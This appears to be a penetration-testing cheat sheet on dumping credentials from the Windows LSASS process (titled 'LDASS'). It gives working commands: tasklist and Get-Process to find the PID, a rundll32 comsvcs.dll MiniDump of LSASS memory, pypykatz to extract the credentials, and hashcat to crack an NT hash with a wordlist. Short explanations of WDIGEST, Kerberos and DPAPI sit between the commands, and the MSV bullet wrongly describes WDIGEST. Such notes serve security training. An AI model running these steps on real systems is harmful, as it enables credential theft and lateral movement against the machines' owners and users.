# Attacking LDASS

***

Find LDASS PID

```cmd
C:\Windows\system32> tasklist /svc
```

```powershell
PS C:\Windows\system32> Get-Process lsass
```

## Create LDASS dump

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

smbserver to transfer the file

## Extract credentials

```bash
pypykatz lsa minidump lsass.dmp 
```

* _MSV_: `WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST.
* _Kerberos_: Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
* _DPAPI_: The Data Protection Application Programming Interface is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.

## Crack NT Hash

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
